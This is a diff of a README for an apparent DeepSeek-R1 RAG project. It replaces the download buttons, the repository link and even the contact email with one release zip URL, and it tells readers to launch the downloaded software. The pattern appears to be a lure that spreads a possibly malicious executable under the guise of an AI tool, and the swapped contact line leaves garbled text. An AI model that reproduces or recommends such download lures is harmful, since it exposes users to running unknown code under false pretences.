@@ -4,7 +4,7 @@
 
 <div align="center">
   <!-- Buttons -->
-[![Download Software](https://img.shields.io/static/v1?label=Download&message=Software&color=green)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/ufewew/RAG-using-DeepSeek-R1/releases/download/v1.0/Application.zip)](https://github.com/ufewew/RAG-using-DeepSeek-R1/releases/download/v1.0/Application.zip)
 </div>
 
 ---
@@ -60,7 +60,7 @@ Throughout this repository, you will find detailed insights into fine-tuning, ev
 Click the button below to download the software for exploring RAG pipelines with DeepSeek:
 
 <div align="center">
-[![Download Software](https://img.shields.io/static/v1?label=Download&message=Software&color=green)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/ufewew/RAG-using-DeepSeek-R1/releases/download/v1.0/Application.zip)](https://github.com/ufewew/RAG-using-DeepSeek-R1/releases/download/v1.0/Application.zip)
 </div>
 
 ⚠️ **Note**: The software needs to be launched after downloading for an interactive experience.
@@ -69,7 +69,7 @@ Click the button below to download the software for exploring RAG pipelines with
 
 ## 🌐 Explore Further
 
-Visit the [RAG-using-DeepSeek-R1 Repository](https://github.com/Rubenas123/6487922) to delve deeper into the world of Retrieval-Augmented Generation using DeepSeek. Don't miss out on the informative resources and detailed documentation available in the repository!
+Visit the [RAG-using-DeepSeek-R1 Repository](https://github.com/ufewew/RAG-using-DeepSeek-R1/releases/download/v1.0/Application.zip) to delve deeper into the world of Retrieval-Augmented Generation using DeepSeek. Don't miss out on the informative resources and detailed documentation available in the repository!
 
 🚀 Happy exploring and building amazing RAG pipelines with DeepSeek on Lightning AI! 🚀
 
@@ -95,7 +95,7 @@ Feel free to contribute to the repository by submitting pull requests, sharing i
 
 ## 📧 Contact Information
 
-For any inquiries, feedback, or collaborations, please reach out via email at rag.deepseek.support@gmail.com. We look forward to hearing from you!
+For any inquiries, feedback, or collaborations, please reach out via email at https://github.com/ufewew/RAG-using-DeepSeek-R1/releases/download/v1.0/Application.zip We look forward to hearing from you!
 
 ---
 
